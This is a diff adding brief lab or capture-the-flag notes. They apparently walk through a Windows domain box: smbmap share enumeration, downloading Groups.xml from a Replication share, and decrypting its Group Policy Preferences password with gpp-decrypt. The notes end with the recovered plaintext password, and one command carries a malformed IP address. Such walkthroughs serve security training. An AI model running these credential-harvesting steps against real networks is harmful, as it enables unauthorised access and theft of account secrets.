@@ -1,0 +1,27 @@
+
+Enumerate shares with smbmap:
+smbmap -H 10.10.10.100
+
+
+Enumerate content of replication directory:
+smbmap -H 10.10.10.10.100 -R Replication
+
+
+
+Get Groups.xml file:
+smbmap -H 10.10.10.100 -R Replication -A Groups.xml -q
+
+Get the content of downloaded groups.xml:
+updatedb
+locate Groups.xml
+cat <groups.xml file>
+
+Decrypt password from Groups.xml file:
+gpp-decrypt <string>
+
+
+Install gpp-decrypt:
+sudo apt-get install gpp-decrypt
+
+
+GPPstillStandingStrong2k18
